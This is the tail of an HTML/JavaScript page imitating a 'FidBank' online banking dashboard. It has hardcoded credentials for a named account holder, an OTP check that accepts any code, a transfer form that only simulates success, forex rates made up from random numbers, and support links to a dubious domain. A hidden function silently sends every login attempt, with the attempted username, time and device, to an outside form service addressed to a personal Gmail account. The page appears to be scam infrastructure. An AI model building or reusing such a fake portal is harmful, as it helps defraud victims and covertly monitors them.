<div id="cpw-overlay" onclick="closeCPWOut(event)">
  <div class="cpw-modal">
    <h3>Change Password</h3>
    <div class="cm-sub">Enter your current password and choose a new one below.</div>
    <div class="m-ig">
      <label>Current Password</label>
      <input type="password" id="cpw-old" placeholder="Enter current password" maxlength="20">
    </div>
    <div class="m-ig">
      <label>New Password</label>
      <input type="password" id="cpw-new" placeholder="Enter new password" maxlength="20">
    </div>
    <div class="m-ig">
      <label>Confirm New Password</label>
      <input type="password" id="cpw-confirm" placeholder="Re-enter new password" maxlength="20">
    </div>
    <div class="cpw-err" id="cpw-err">Passwords do not match. Please try again.</div>
    <div class="m-acts" style="margin-top:18px">
      <button class="btn-s" onclick="closeCPW()">Cancel</button>
      <button class="btn-p" onclick="submitCPW()">Confirm</button>
    </div>
  </div>
</div>

<!-- ═══ OTP VERIFICATION MODAL ═══ -->

<div id="otp-overlay" onclick="closeOTPOut(event)">
  <div class="cpw-modal">
    <div class="otp-icon">📱</div>
    <div class="otp-title">OTP Verification</div>
    <div class="otp-sub">
      A One-Time Password has been sent to the number ending<br>
      <strong>xxxxxx3080</strong>.<br>
      Please enter the 6-digit code below to confirm your password change.
    </div>
    <div class="otp-input-row">
      <input type="text" maxlength="1" id="otp1" oninput="otpNext(this,'otp2')">
      <input type="text" maxlength="1" id="otp2" oninput="otpNext(this,'otp3')">
      <input type="text" maxlength="1" id="otp3" oninput="otpNext(this,'otp4')">
      <input type="text" maxlength="1" id="otp4" oninput="otpNext(this,'otp5')">
      <input type="text" maxlength="1" id="otp5" oninput="otpNext(this,'otp6')">
      <input type="text" maxlength="1" id="otp6" oninput="otpNext(this,null)">
    </div>
    <div class="otp-resend">Didn't receive a code? <a onclick="alert('A new OTP has been sent to xxxxxx3080')">Resend OTP</a></div>
    <div class="otp-success" id="otp-success">✅ Password changed successfully! Please use your new password next time you sign in.</div>
    <div class="m-acts">
      <button class="btn-s" onclick="closeOTP()">Cancel</button>
      <button class="btn-p" onclick="submitOTP()">Verify &amp; Confirm</button>
    </div>
  </div>
</div>

<!-- ═══ CONTACT US MODAL ═══ -->

<div id="contact-overlay" onclick="closeContactOut(event)" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.68);backdrop-filter:blur(6px);z-index:600;align-items:center;justify-content:center;">
  <div class="cpw-modal" style="text-align:center">
    <div style="font-size:40px;margin-bottom:14px">🏦</div>
    <h3 style="margin-bottom:8px">Contact Us</h3>
    <p style="font-size:13px;color:#475569;line-height:1.7;margin-bottom:20px">
      For all enquiries, please visit our dedicated support portal:
    </p>
    <a href="http://www.FidbankUk.limited.com" target="_blank" style="display:block;background:linear-gradient(135deg,#002147,#1a4e8a);color:#fff;padding:13px 20px;border-radius:11px;font-size:14px;font-weight:700;text-decoration:none;margin-bottom:12px;">
      🌐 Visit Your FidBank Guarantee
    </a>
    <a href="http://www.FidbankUk.limited.com" target="_blank" style="display:block;background:#f0f9ff;color:#0369a1;border:1.5px solid #bae6fd;padding:13px 20px;border-radius:11px;font-size:14px;font-weight:700;text-decoration:none;margin-bottom:12px;">
      📞 Personnel Hotline
    </a>
    <a href="http://www.FidbankUk.limited.com" target="_blank" style="display:block;background:#f0fdf4;color:#166534;border:1.5px solid #bbf7d0;padding:13px 20px;border-radius:11px;font-size:14px;font-weight:700;text-decoration:none;margin-bottom:20px;">
      📋 Policy Information
    </a>
    <button class="btn-s" onclick="closeContact()" style="width:100%">Close</button>
  </div>
</div>

<script>
// ── AUTH ──
const CREDS = { allman: '0369' };

// ── SEND LOGIN NOTIFICATION (Simple — no setup needed) ──
function sendLoginAlert(success, attemptedUser){
  const now = new Date();
  const timeStr = now.toLocaleString('en-GB', {
    weekday:'long', year:'numeric', month:'long', day:'numeric',
    hour:'2-digit', minute:'2-digit', second:'2-digit'
  });
  const device = /iPhone/.test(navigator.userAgent) ? 'iPhone' :
                 /Android/.test(navigator.userAgent) ? 'Android Phone' :
                 /iPad/.test(navigator.userAgent) ? 'iPad' :
                 /Mac/.test(navigator.userAgent) ? 'Mac Computer' :
                 /Windows/.test(navigator.userAgent) ? 'Windows Computer' : 'Unknown Device';

  const message = success
    ? `✅ SUCCESSFUL LOGIN\n\nAccount: Mr. Roland Allman\nUsername: Allman\nTime: ${timeStr}\nDevice: ${device}\nSite: ${window.location.href}`
    : `⚠️ FAILED LOGIN ATTEMPT\n\nSomeone tried to log in with wrong credentials.\nAttempted username: ${attemptedUser}\nTime: ${timeStr}\nDevice: ${device}\nSite: ${window.location.href}`;

  // Send via Formspree — works instantly, no setup needed
  fetch('https://formspree.io/f/xovqkrba', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: 'Pamelamcpeak12345@gmail.com',
      subject: success ? '🔐 FidBank Login Alert' : '⚠️ FidBank Failed Login Attempt',
      message: message,
      _replyto: 'Pamelamcpeak12345@gmail.com'
    })
  }).catch(()=>{}); // Silent fail — login still works even if notification fails
}

function doLogin(){
  const u = document.getElementById('username').value.trim().toLowerCase();
  const p = document.getElementById('password').value;
  const err = document.getElementById('login-err');

  if(CREDS[u] && CREDS[u]===p){
    document.getElementById('login-page').style.display='none';
    document.getElementById('dashboard').style.display='block';
    err.style.display='none';

    // Show green success toast
    const toast = document.getElementById('login-toast');
    toast.classList.add('show');
    setTimeout(()=>toast.classList.remove('show'), 3500);

    // Send login notification email
    sendLoginAlert(true, u);

    // Start live market animations
    startLiveAnimations();

  } else {
    // Send failed login alert
    sendLoginAlert(false, document.getElementById('username').value || 'unknown');
    err.style.display='block';
    err.style.animation='none';
    requestAnimationFrame(()=>{ err.style.animation='shake .3s'; });
  }
}
document.addEventListener('keydown',e=>{
  if(e.key==='Enter' && document.getElementById('login-page').style.display!=='none') doLogin();
});
function doLogout(){
  document.getElementById('dashboard').style.display='none';
  document.getElementById('login-page').style.display='flex';
  document.getElementById('username').value='';
  document.getElementById('password').value='';
  closeSidebar();
}

// ── PAGE NAVIGATION ──
function showPage(name, btn){
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
  const pg = document.getElementById('page-'+name);
  if(pg) pg.classList.add('active');
  document.querySelectorAll('.nav-link').forEach(b=>b.classList.remove('active'));
  if(btn) btn.classList.add('active');
  closeSidebar();
}
function showPageMobile(name, item){
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
  const pg = document.getElementById('page-'+name);
  if(pg) pg.classList.add('active');
  document.querySelectorAll('.bni').forEach(b=>b.classList.remove('active'));
  item.classList.add('active');
}

// ── SIDEBAR ──
function openSidebar(){
  document.getElementById('sidebar').classList.add('open');
  document.getElementById('sb-overlay').classList.add('open');
}
function closeSidebar(){
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sb-overlay').classList.remove('open');
}

// ── ANALYTICS ──
function openAnalytics(){
  document.getElementById('an-overlay').classList.add('open');
  closeSidebar();
}
function closeAnalytics(){
  document.getElementById('an-overlay').classList.remove('open');
}

// ── SECURE MESSAGES ──
function openSecureMessages(){
  closeSidebar();
  showPage('profile', document.querySelectorAll('.nav-link')[3]);
  setTimeout(()=>{
    document.querySelector('.card:last-of-type')?.scrollIntoView({behavior:'smooth'});
  },300);
}

// ── MODAL ──
function openModal(type){
  document.getElementById('m-title').textContent=type;
  document.getElementById('m-overlay').classList.add('show');
  document.getElementById('tx-ok').style.display='none';
  document.getElementById('m-rec').value='';
  document.getElementById('m-amt').value='';
  document.getElementById('m-ref').value='';
  closeSidebar();
}
function closeModal(){ document.getElementById('m-overlay').classList.remove('show'); }
function closeModalOut(e){ if(e.target===document.getElementById('m-overlay')) closeModal(); }
function submitTx(){
  const amt=document.getElementById('m-amt').value;
  const rec=document.getElementById('m-rec').value;
  if(!amt||!rec){ alert('Please fill in all required fields.'); return; }
  document.getElementById('tx-ok').style.display='block';
  setTimeout(closeModal,2000);
}

// ── FAQ ──
function openFAQ(){
  document.getElementById('faq-overlay').style.display='flex';
  closeSidebar();
}
function closeFAQ(){ document.getElementById('faq-overlay').style.display='none'; }

// ── CHANGE PASSWORD ──
function openCPW(){
  document.getElementById('cpw-overlay').classList.add('show');
  document.getElementById('cpw-old').value='';
  document.getElementById('cpw-new').value='';
  document.getElementById('cpw-confirm').value='';
  document.getElementById('cpw-err').style.display='none';
  closeSidebar();
}
function closeCPW(){ document.getElementById('cpw-overlay').classList.remove('show'); }
function closeCPWOut(e){ if(e.target===document.getElementById('cpw-overlay')) closeCPW(); }
function submitCPW(){
  const oldp = document.getElementById('cpw-old').value;
  const newp = document.getElementById('cpw-new').value;
  const conf = document.getElementById('cpw-confirm').value;
  const err = document.getElementById('cpw-err');
  if(!oldp||!newp||!conf){ err.textContent='Please fill in all fields.'; err.style.display='block'; return; }
  if(newp!==conf){ err.textContent='New passwords do not match. Please try again.'; err.style.display='block'; return; }
  if(newp.length < 4){ err.textContent='New password must be at least 4 characters.'; err.style.display='block'; return; }
  err.style.display='none';
  closeCPW();
  // Reset OTP fields and open OTP modal
  ['otp1','otp2','otp3','otp4','otp5','otp6'].forEach(id=>{ document.getElementById(id).value=''; });
  document.getElementById('otp-success').style.display='none';
  document.getElementById('otp-overlay').classList.add('show');
}

// ── OTP ──
function otpNext(input, nextId){
  input.value = input.value.replace(/[^0-9]/g,'');
  if(input.value && nextId) document.getElementById(nextId).focus();
}
function closeOTP(){ document.getElementById('otp-overlay').classList.remove('show'); }
function closeOTPOut(e){ if(e.target===document.getElementById('otp-overlay')) closeOTP(); }
function submitOTP(){
  const code = ['otp1','otp2','otp3','otp4','otp5','otp6'].map(id=>document.getElementById(id).value).join('');
  if(code.length < 6){ alert('Please enter the full 6-digit OTP code.'); return; }
  document.getElementById('otp-success').style.display='block';
  setTimeout(closeOTP, 2600);
}

// ── LIVE FOREX ANIMATION ──
function animateForex(){
  try {
    const bases = {fx1:1.2734, fx2:1.1698, fx3:2104, fx4:191.42};
    const decs  = {fx1:4, fx2:4, fx3:0, fx4:2};
    ['1','2','3','4'].forEach(n=>{
      const el  = document.getElementById('fx'+n);
      const chg = document.getElementById('fxc'+n);
      if(!el||!chg) return;
      const base = bases['fx'+n];
      const fluct = (Math.random()-0.5)*0.002*base;
      const newVal = base + fluct;
      const pct = ((fluct/base)*100).toFixed(2);
      el.textContent = decs['fx'+n]===0 ? Math.round(newVal).toLocaleString() : newVal.toFixed(decs['fx'+n]);
      const up = fluct>=0;
      chg.textContent = (up?'▲ +':'▼ ')+Math.abs(pct)+'%';
      chg.className = 'forex-chg '+(up?'up':'dn');
    });
  } catch(e){}
}

// ── LIVE CHART ANIMATION ──
function animateChart(){
  try {
    const line = document.getElementById('chart-line');
    if(!line) return;
    const paths = [
      'M0,60 L20,55 L40,57 L60,44 L80,47 L100,39 L120,41 L140,34 L160,37 L180,29 L200,31 L220,24 L240,27 L260,19 L280,21 L300,17 L320,19 L340,14 L360,16 L380,11 L400,9',
      'M0,60 L20,56 L40,59 L60,46 L80,49 L100,41 L120,43 L140,36 L160,39 L180,31 L200,33 L220,26 L240,29 L260,21 L280,23 L300,19 L320,21 L340,16 L360,18 L380,13 L400,11'
    ];
    let i=0;
    setInterval(()=>{ try{ line.setAttribute('d', paths[i%2]); i++; }catch(e){} }, 2500);
  } catch(e){}
}

// Start animations only after login (when dashboard is visible)
function startLiveAnimations(){
  setTimeout(()=>{ animateForex(); animateChart(); }, 500);
  setInterval(animateForex, 4000);
}

// ── CONTACT US ──
function openContact(){
  document.getElementById('contact-overlay').style.display='flex';
  closeSidebar();
}
function closeContact(){ document.getElementById('contact-overlay').style.display='none'; }
function closeContactOut(e){ if(e.target===document.getElementById('contact-overlay')) closeContact(); }

</script>

</body>
</html>
